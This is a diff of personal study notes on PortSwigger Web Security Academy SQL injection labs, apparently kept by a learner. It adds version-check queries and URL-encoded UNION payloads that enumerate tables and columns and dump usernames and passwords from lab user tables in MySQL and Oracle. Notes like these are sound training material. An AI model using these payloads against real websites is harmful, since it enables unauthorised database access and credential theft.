@@ -47,7 +47,8 @@ Learned intercept to hack from there and the GUI
 
 3. Examining the database
 https://portswigger.net/web-security/sql-injection/examining-the-database
-Oracle: SELECT * FROM v$version UNION SELECT * FROM information_schema.tables; schema is just tabled and column info no data just the meta.
+DATABASE VERSION
+Oracle: SELECT v$version 
 Microsoft, MySQL: 	SELECT @@version 
 PostgreSQL: 	SELECT version() 
 A. Oracle 
@@ -68,11 +69,24 @@ Finding the string
 Solution to get database info:
 https://0a450001049f6a69c215b5f400880062.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'v$version','NULL'+FROM+dual--
 
-
-
 B. Microsoft, MySQL: 	SELECT @@version
 ' SELECT @@version--
 filter?category='+UNION+SELECT+'@@version',@@version--%20            The second one with no quotes is what gets it to work, with quotes no worky
+%27 '   %20 space           I'm not to sure why it needs a space at the end. 
+https://developers.google.com/maps/url-encoding#:~:text=For%20example%2C%20spaces%20in%20a,should%20be%20encoded%20as%20%2C%20
+Response: 8.0.31-0ubuntu0.20.04.2  You might assume MySQL due to ubuntu but ubuntu can run MSSQL aswell. 
+
+TABLE INFORMATION:
+MySQL
+Gifts'+UNION+SELECT+'NULL','NULL'--%20
+Gifts'+UNION+SELECT+'TABLE_NAME','NULL'+FROM+information_schema.columns--%20
+'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.columns--%20
+'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fpfwso'--
+'UNION+SELECT+password_lyezkm,+username_tjsciv+FROM+users_fpfwso--%20
+Oracle
+'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--        USERS_QKSSMB
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QKSSMB'--
+'+UNION+SELECT+USERNAME_LUHQDI,PASSWORD_YUZNLF+FROM+USERS_QKSSMB'--
 
 4. Blind SQL injection vulnerabilities
 https://portswigger.net/web-security/sql-injection/blind
